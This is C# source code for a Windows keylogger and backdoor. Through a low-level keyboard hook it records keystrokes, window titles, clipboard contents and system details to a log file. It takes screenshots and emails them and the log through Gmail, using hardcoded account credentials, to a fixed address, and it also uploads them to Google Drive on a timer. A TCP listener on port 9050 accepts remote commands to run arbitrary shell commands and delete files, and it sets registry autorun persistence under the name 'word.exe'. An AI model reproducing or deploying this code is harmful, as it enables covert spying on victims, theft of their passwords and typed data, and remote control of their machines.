using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Permissions;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;


namespace ConsoleApp2
{
    class Program
    {
        const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;

        static Dictionary<char, char> dictionaryRusEng = new Dictionary<char, char>();
        static Dictionary<char, char> dictionaryDigits = new Dictionary<char, char>();

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // ShowWindow(handle, SW_HIDE);
            ShowWindow(handle, 1);
            fillDictionaries();
            _hookID = SetHook(_proc);

            Writer("\n========================================================================================================================\n\nCurrentDirectory: " + Environment.CurrentDirectory + "\n");
            Writer("MachineName: " + Environment.MachineName + "\n");
            Writer("OSVersion: " + Environment.OSVersion.ToString() + "\n");
            Writer("SystemDirectory: " + Environment.SystemDirectory + "\n");
            Writer("UserDomainName: " + Environment.UserDomainName + "\n");
            Writer("UserInteractive: " + Environment.UserInteractive + "\n");
            Writer("UserName: " + Environment.UserName + "\n\n========================================================================================================================\n\n");

            Console.WriteLine(AppDomain.CurrentDomain.BaseDirectory);
            Console.WriteLine(System.Net.Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString());

            string htmlData = GetBuff();
            Console.WriteLine("Clipboard: {0}\n", htmlData);
            ushort lang = GetKeyboardLayout();
            mss = lang.ToString();
            Writer("Original keyboard layout: " + mss + "\n");
            Thread connectionsListener = new System.Threading.Thread(ServerSocket);
            connectionsListener.Start();
            intervalSending = new Thread(SendEverything);
            intervalSending.Start();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static Thread intervalSending;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static string PreviousProgram = "";

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string CurrentProgram = GetActiveWindowTitle();
                if (!CurrentProgram.Equals(PreviousProgram))
                {
                    PreviousProgram = CurrentProgram;
                    string time = DateTime.Now.ToString();
                    Writer("\n\t[Program: " + CurrentProgram + "\n\tDateTime: " + time + "]\n");
                }
                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)vkCode);
                string original = mystring;
                string encrypted;
                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                bool sh = Control.ModifierKeys != Keys.Shift;
                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();
                if (mss == mss_check) { }
                else
                {
                    Writer("\n\t< Смена раскладки: " + mss_check + " >\n");
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if (GetKeyboardLayout() == 1049 && original.Length == 1)
                    {
                        original = Russian(original[0]);
                    }

                    if (original.Length == 1 && capsLock && char.IsLetter(original[0]))
                    {

                        original = ChangeRegister(original[0]);
                    }
                    if (original.Length == 1 && sh && char.IsLetter(original[0]))
                    {
                        original = ChangeRegister(original[0]);
                    }

                    if (original.Length == 1 && !sh && (char.IsDigit(original[0]) || original[0] == '`' || original[0] == '-' || original[0] == '='))
                    {
                        original = DigitToSym(original[0]);
                    }
                    if (original.Length == 1)
                        Writer(original);

                }

                if (wParam == (IntPtr)WM_KEYUP)
                {
                    if (Keys.LControlKey == (Keys)vkCode)
                    {

                    }
                    if (Keys.LShiftKey == (Keys)vkCode)
                    {
                    }
                    if (Keys.Space == (Keys)vkCode)
                    {
                        Writer(" ");
                    }
                    if (Keys.Enter == (Keys)vkCode)
                    {
                        Writer("\n");
                    }
                    if (Keys.Tab == (Keys)vkCode)
                    {
                        Writer("<tab>");
                    }

                    if (Keys.Back == (Keys)vkCode)
                    {
                        Writer("<backspace>");
                    }

                    if (Keys.OemOpenBrackets == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("{"); }
                            else Writer("[");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Х';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }
                    if (Keys.OemCloseBrackets == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("}"); }
                            else Writer("]");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ъ';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift != Control.ModifierKeys)
                    {
                        Writer("\\");
                    }

                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
                    {
                        Writer("|");
                    }

                    if (Keys.Oem7 == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("\""); }
                            else Writer("'");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Э';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }
                    if (Keys.Oem1 == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(":"); }
                            else Writer(";");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ж';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                    if (Keys.OemQuestion == (Keys)vkCode)
                    {
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("?"); }
                            else Writer("/");
                        }
                        else if (lang_check == 1049)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(","); }
                            else Writer(".");
                        }
                    }

                    if (Keys.OemPeriod == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(">"); }
                            else Writer(".");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ю';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                    if (Keys.Oemcomma == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("<"); }
                            else Writer(",");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Б';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }
                }

                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    string htmlData1 = GetBuff();
                    Writer("\n\t<COPY>\n");
                    Writer("Содержимое буфера: " + htmlData1 + "\n");
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<PASTE> \n");
                    Writer("Содержимое буфера: " + GetBuff().ToString() + "\n");
                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<CANCEL>\n");
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<SEARCH>\n");
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<SELECT ALL>\n");
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<NEW>\n");
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<CTRL T>\n");
                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n\t<CUT>\n");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.UnicodeText);
            return htmlData;
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
        public static string Russian(char sym)
        {
            if (char.IsLetter(sym))
            {
                return dictionaryRusEng[sym].ToString();
            }
            return sym.ToString();
        }

        public static string ChangeRegister(char sym)
        {
            if (char.IsLower(sym))
            {
                return char.ToUpper(sym).ToString();
            }
            else if (char.IsUpper(sym))
            {
                return char.ToLower(sym).ToString();
            }
            return sym.ToString();
        }

        public static string DigitToSym(char sym)
        {
            return dictionaryDigits[sym].ToString();
        }

        private static void fillDictionaries()
        {
            dictionaryRusEng.Add('Q', 'Й');
            dictionaryRusEng.Add('W', 'Ц');
            dictionaryRusEng.Add('E', 'У');
            dictionaryRusEng.Add('R', 'К');
            dictionaryRusEng.Add('T', 'Е');
            dictionaryRusEng.Add('Y', 'Н');
            dictionaryRusEng.Add('U', 'Г');
            dictionaryRusEng.Add('I', 'Ш');
            dictionaryRusEng.Add('O', 'Щ');
            dictionaryRusEng.Add('P', 'З');
            dictionaryRusEng.Add('[', 'Х');
            dictionaryRusEng.Add(']', 'Ъ');
            dictionaryRusEng.Add('A', 'Ф');
            dictionaryRusEng.Add('S', 'Ы');
            dictionaryRusEng.Add('D', 'В');
            dictionaryRusEng.Add('F', 'А');
            dictionaryRusEng.Add('G', 'П');
            dictionaryRusEng.Add('H', 'Р');
            dictionaryRusEng.Add('J', 'О');
            dictionaryRusEng.Add('K', 'Л');
            dictionaryRusEng.Add('L', 'Д');
            dictionaryRusEng.Add(';', 'Ж');
            dictionaryRusEng.Add('\'', 'Э');
            dictionaryRusEng.Add('Z', 'Я');
            dictionaryRusEng.Add('X', 'Ч');
            dictionaryRusEng.Add('C', 'С');
            dictionaryRusEng.Add('V', 'М');
            dictionaryRusEng.Add('B', 'И');
            dictionaryRusEng.Add('N', 'Т');
            dictionaryRusEng.Add('M', 'Ь');
            dictionaryRusEng.Add(',', 'Б');
            dictionaryRusEng.Add('.', 'Ю');
            dictionaryRusEng.Add('`', 'Ё');


            dictionaryDigits.Add('1', '!');
            dictionaryDigits.Add('2', '@');
            dictionaryDigits.Add('3', '#');
            dictionaryDigits.Add('4', '$');
            dictionaryDigits.Add('5', '%');
            dictionaryDigits.Add('6', '^');
            dictionaryDigits.Add('7', '&');
            dictionaryDigits.Add('8', '*');
            dictionaryDigits.Add('9', '(');
            dictionaryDigits.Add('0', ')');
            dictionaryDigits.Add('`', '~');
            dictionaryDigits.Add('-', '_');
            dictionaryDigits.Add('=', '+');

        }

        public static void Writer(string inputstring)
        {

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.dat", true);
            Console.WriteLine(inputstring);
            sw.Write(inputstring);
            sw.Flush();
            sw.Close();

        }

        public static void ServerSocket()
        {

            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            newsock.Bind(ipep);
            newsock.Listen(10);
            Console.WriteLine("Waiting for a client...");
            while (true)
            {
                {
                    try
                    {
                        Socket client = newsock.Accept();
                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
                        string data = null;
                        byte[] bytes = new byte[1024 * 1024];
                        int bytesRec = client.Receive(bytes);
                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);
                        Console.Write("Полученный текст: " + data + "\n\n");
                        var splitChars = new[] { ' ' };
                        string Arguments = "";
                        string[] a = data.Split(splitChars, 2);
                        string fileName = a[0];
                        if (a.Length > 1) Arguments = a[1];
                        switch (fileName)
                        {
                            case "mail":
                                Screenshot("\\screen.jpg");
                                SmtpSend(DateTime.Now.ToString(), "\\screen.jpg", "\\log.dat", Arguments);
                                if (Arguments.Length == 0)
                                    SSend("mail sent to donlancaster228@gmail.com", client);
                                else SSend("mail sent to " + Arguments, client);
                                break;
                            case "ipconfig":
                                NewProcess("ipconfig", Arguments, client);
                                break;
                            case "help":
                                SSend("\nСинтаксис: cmd params <Enter>\nПримеры:\ncmd taskkill /IM notepad.exe /f" +
                                "\ncmd tasklist	\ncmd ipconfig /all\ncmd notepad.exe\n\nУдаление файлов:\ndel path_to_file или cmd del path_to file" +
                                "\nАвтозапуск: autorun true/false\n" +
                                "\nscreen - отпраивть скриншот экрана\n" +
                                "\nlog - отпраивть лог-файл клиенту\n" +
                                "\nmail - отпраивть скриншот и лог-файл на почту\n" +
                                "\ngoogle - загрузить файлы на Google Drive\n\n", client);
                                break;
                            case "quit":
                                SSend("BYE!", client);
                                break;
                            case "autorun":
                                if (Arguments.Length == 0)
                                {
                                    Console.WriteLine("Для команды флаги обязательны");
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }
                                if (Arguments == "true")
                                {
                                    SetAutorunValue(true, client);
                                    break;
                                }
                                else if (Arguments == "false")
                                {
                                    SetAutorunValue(false, client);
                                    break;
                                }
                                else
                                {
                                    Console.WriteLine("Введены неверные знаения. Поддерживаются только true и false");
                                    SSend("Введены неверные знаения. Поддерживаются только true и false", client);
                                    break;
                                }
                            case "cmd":
                                if (Arguments.Length == 0)
                                {
                                    Console.WriteLine("Для команды флаги обязательны");
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }
                                NewProcess("cmd.exe", "/C" + Arguments, client);
                                break;
                            case "del":
                                if (Arguments.Length == 0)
                                {
                                    Console.WriteLine("Для команды флаги обязательны");
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }
                                FileInfo fi2 = new FileInfo(Arguments);
                                if (!File.Exists(fi2.FullName))
                                {
                                    SSend("Файла по указанному пути не существует", client);
                                    break;
                                }
                                try
                                {
                                    fi2.Delete();
                                    SSend("Файл удален", client);
                                }
                                catch (Exception ex)
                                {
                                    SSend(ex.ToString(), client);
                                    break;
                                }
                                break;
                            case "thread":
                                if (Arguments.Length == 0)
                                {
                                    Console.WriteLine("Для команды флаги обязательны");
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }
                                intervalSending.Abort();
                                int time = 0;
                                string receiver = "";
                                if (Arguments.Contains(" "))
                                {
                                    if (Arguments.Split(' ').Length >= 2)
                                    {
                                        time = Convert.ToInt32(Arguments.Split(' ')[0]);
                                        receiver = Arguments.Split(' ')[1];
                                    }
                                }
                                else
                                {
                                    time = Convert.ToInt32(Arguments);
                                    receiver = "donlancaster228@gmail.com";
                                }

                           

                                if (time >= 10000)
                                {
                                    try
                                    {
                                        intervalSending = new Thread(() => SendEverything(time, receiver));
                                    }
                                    catch (ArgumentException e)
                                    {

                                    }
                                    intervalSending.Start();
                                    SSend("Интервал изменен на " + time + " ms, получатель " + receiver, client);
                                }
                                else
                                {
                                    SSend("функция загрузки с интервалом отключена.", client);
                                }


                                //very.Start(SendEverything(time))


                                break;
                            default:
                                SSend("Чтобы посмотреть доступные команды введите help", client);
                                break;
                        }
                        if (fileName == "screen")
                        {
                            Screenshot("\\screen.jpg");
                            try
                            {
                                SocketWorker(@"\screen.jpg", client);
                            }
                            catch (Exception ex)
                            {
                                Console.Write(ex.Message);
                            }
                        }
                        if (fileName == "log")
                        {
                            try
                            {
                                SocketWorker(@"\log.dat", client);
                            }
                            catch (Exception ex)
                            {
                                Console.Write(ex.Message);
                            }
                        }
                        /*              if (fileName == "mail")
                                      {
                                          Screenshot("\\screen.jpg");
                                          SmtpSend(DateTime.Now.ToString(), "\\screen.jpg", "\\log.dat", "");
                                          SSend("mail sent", client);
                                      }
              */
                        if (fileName == "google")
                        {
                            Screenshot("screen.jpg");
                            GoogleDriveLoad("log.dat", "screen.jpg");
                            SSend("google drive updated", client);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Write(e.Message);

                    }
                }
            }
        }

        private static void SmtpSend(string message, string screenshot, string log, string receiver)

        {
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.Credentials = new System.Net.NetworkCredential("k0z9vk1n@gmail.com", "keylogger");
            client.EnableSsl = true;
            string msgFrom = "k0z9vk1n@gmail.com";
            string msgTo = "donlancaster228@gmail.com";
            if (receiver.Trim().Length != 0)
                msgTo = receiver;

            string msgSubject = "keylogger";
            MailMessage msg = new MailMessage(msgFrom, msgTo, msgSubject, message);
            Attachment a = new Attachment(AppDomain.CurrentDomain.BaseDirectory + log);
            Attachment b = new Attachment(AppDomain.CurrentDomain.BaseDirectory + screenshot);
            msg.Attachments.Add(a);
            msg.Attachments.Add(b);
            client.Send(msg);
            a.Dispose();
            b.Dispose();
            client.Dispose();
        }

        private static void SendEverything(int time, string receiver)
        {
            while (true)
            {
                string message = "sent by thread" + DateTime.Now.ToString();
                if (File.Exists(Application.StartupPath + "\\logTMP.dat"))
                {
                    File.Delete(Application.StartupPath + "\\logTMP.dat");
                }
                File.Copy(Application.StartupPath + "\\log.dat", Application.StartupPath + "\\logTMP.dat");
                Screenshot("\\screenTMP.jpg");
                SmtpSend(message, "\\screenTMP.jpg", "\\logTMP.dat", receiver);
                Thread.Sleep(1000);
                GoogleDriveLoad("screenTMP.jpg", "logTMP.dat");
                Thread.Sleep(time);
            }
        }

        private static void SendEverything()
        {
            while (true)
            {
                string message = "sent by thread" + DateTime.Now.ToString();
                if (File.Exists(Application.StartupPath + "\\logTMP.dat"))
                {
                    File.Delete(Application.StartupPath + "\\logTMP.dat");
                }
                File.Copy(Application.StartupPath + "\\log.dat", Application.StartupPath + "\\logTMP.dat");
                Screenshot("\\screenTMP.jpg");
                SmtpSend(message, "\\screenTMP.jpg", "\\logTMP.dat", "");
                Thread.Sleep(1000);
                GoogleDriveLoad("screenTMP.jpg", "logTMP.dat");
                Thread.Sleep(600000);
            }
        }


        public static void Screenshot(string name)
        {
            Graphics graph = null;
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(Application.StartupPath + name);
            bmp.Dispose();
        }

        public static void SSend(string reply, Socket client)
        {
            byte[] msg = Encoding.UTF8.GetBytes(reply);
            client.Send(msg);
        }

        public static void SocketWorker(string fileName, Socket client)
        {
            string filePath = Application.StartupPath;
            byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);
            byte[] fileData = File.ReadAllBytes(filePath + fileName);
            byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
            byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);
            fileNameLen.CopyTo(clientData, 0);
            fileNameByte.CopyTo(clientData, 4);
            fileData.CopyTo(clientData, 4 + fileNameByte.Length);
            client.Send(clientData);
            Console.WriteLine("File:{0} has been sent", fileName);
        }

        public static void GoogleDriveLoad(string screenshot, string log)
        {
            GoogleAPI.Process(log, "text/plain");
            GoogleAPI.Process(screenshot, "image/jpeg");
        }

        const string autorunProgName = "word.exe";

        public static void NewProcess(string s, string f1, Socket client)
        {
            Process process = new Process();
            process.StartInfo.FileName = s;
            process.StartInfo.Arguments = f1;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.Verb = "runas";
            process.Start();
            StreamReader reader = process.StandardOutput;
            string output = reader.ReadToEnd();
            SSend(output, client);
            process.WaitForExit();
            process.Close();
            SSend("\n\nPress an key to exit", client);
        }

        public static void SetAutorunValue(bool autorun, Socket sender)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                {
                    reg.SetValue(autorunProgName, ExePath);
                    SSend("Успешно установлено", sender);
                }
                else
                {
                    reg.DeleteValue(autorunProgName);
                    SSend("Успешно удалено", sender);
                }
                reg.Close();
            }
            catch (Exception e)
            {
                SSend(e.Message, sender);
            }
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
}
